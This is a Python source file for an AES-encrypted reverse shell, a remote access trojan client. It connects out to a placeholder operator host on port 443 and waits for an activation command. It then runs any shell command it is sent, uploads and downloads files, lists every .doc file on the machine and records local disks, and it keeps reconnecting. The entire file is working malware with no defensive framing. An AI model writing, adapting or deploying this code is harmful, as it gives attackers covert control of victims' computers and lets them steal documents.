#!/usr/bin/python

from Crypto.Cipher import AES
import subprocess, socket, base64, time, os, sys
import fnmatch
import wmi
# the block size for the cipher object; must be 16, 24, or 32 for AES
BLOCK_SIZE = 32

# one-liners to encrypt/encode and decrypt/decode a string
# encrypt with AES, encode with base64
EncodeAES = lambda c, s: base64.b64encode(c.encrypt(s))
DecodeAES = lambda c, e: c.decrypt(base64.b64decode(e))

# generate a random secret key
secret = "HUISA78sa9y&9syYSsJhsjkdjklfs9aR"

# server config
HOST = 'xx.xx.xx.xx'
PORT = 443

# session controller
active = False

# Functions
###########

# send data function
def Send(sock, cmd, end="EOFEOFEOFEOFEOFX"):
	sock.sendall(EncodeAES(cipher, cmd + end))
	
# receive data function
def Receive(sock, end="EOFEOFEOFEOFEOFX"):
	data = ""
	l = sock.recv(1024)
	while(l):
		decrypted = DecodeAES(cipher, l)
		data = data + decrypted
		if data.endswith(end) == True:
			break
		else:
			l = sock.recv(1024)
	return data[:-len(end)]

# upload file
def Upload(sock, filename):

	filename = unicode(filename , "utf8")
	bgtr = True
	# file transfer
	try:

		f = open(filename, 'rb')
		while 1:
			fileData = f.read()
			if fileData == '': break
			# begin sending file
			Send(sock, fileData, "")
		f.close()
	except:
		time.sleep(0.1)
	# let server know we're done..
	time.sleep(0.8)
	Send(sock, "")
	time.sleep(0.8)
	return "Finished download."
	
# download file
def Download(sock, filename):
	# file transfer
	g = open(filename, 'wb')
	# download file
	fileData = Receive(sock)
	time.sleep(0.8)
	g.write(fileData)
	g.close()
	# let server know we're done..
	return "Finished upload."
def iterfindfiles(path, fnexp):
    for root, dirs, files in os.walk(path):
        for filename in fnmatch.filter(files, fnexp):
            yield os.path.join(root, filename)
def autofind(path):
    for filename in iterfindfiles(path, "*.doc"):
		f = open(path+'myfind.txt','a')
        	f.write(filename)
        	f.close()
def Checkdisk(path):

	c = wmi.WMI ()
	for disk in c.Win32_LogicalDisk (DriveType=3):
		f = open(path+'disk.txt','a')
		f.write(disk.Caption)
    	f.close()

# main loop
while True:
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((HOST, PORT))
		  
		# create a cipher object using the random secret
		cipher = AES.new(secret,AES.MODE_CFB)

		# waiting to be activated...
		data = Receive(s)
	
		# activate.
		if data == 'Activate':
			active = True
			Send(s, "\n"+os.getcwd()+">")
		
		# interactive loop
		while active:
			
			# Receive data
			data = Receive(s)

			# check for quit
			if data == "quit" or data == "terminate":
				Send(s, "quitted")
				break
				
			# check for change directory
			elif data.startswith("cd ") == True:
				os.chdir(data[3:])
				stdoutput = ""
				
			# check for download
			elif data.startswith("download ") == True:
				# Upload the file
				stdoutput = Upload(s, data[9:])
				
			# check for upload
			elif data.startswith("upload ") == True:
				# Download the file
				stdoutput = Download(s, data[7:])
			elif data.startswith("autofind") ==True:
				autofind(data[9:])
				stdoutput = ""
			elif data.startswith("checkdisk") ==True:

				Checkdisk(data[10:])
				stdoutput = ""
			else:
				# execute command
				proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)

				# save output/error
				stdoutput = proc.stdout.read() + proc.stderr.read()
				
			# send data
			stdoutput = stdoutput+"\n"+os.getcwd()+">"
			stdoutput = stdoutput.decode('gbk').encode('utf-8')
			Send(s, stdoutput)
			
		# loop ends here
		
		if data == "terminate":
			break
		time.sleep(3)
	except socket.error:
		s.close()
		time.sleep(10)
		continue
	      